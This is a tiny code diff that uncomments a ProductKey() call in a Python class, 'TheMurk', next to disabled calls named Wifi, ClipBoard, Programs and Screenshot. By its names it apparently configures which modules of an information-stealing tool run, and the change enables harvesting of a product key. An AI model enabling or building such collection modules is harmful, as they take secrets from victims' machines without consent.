@@ -70,7 +70,7 @@ class TheMurk:
         # Wifi()
         # ClipBoard()
         # Programs()
-        # ProductKey()
+        ProductKey()
         # Screenshot()
     
     def Conclusion(self):
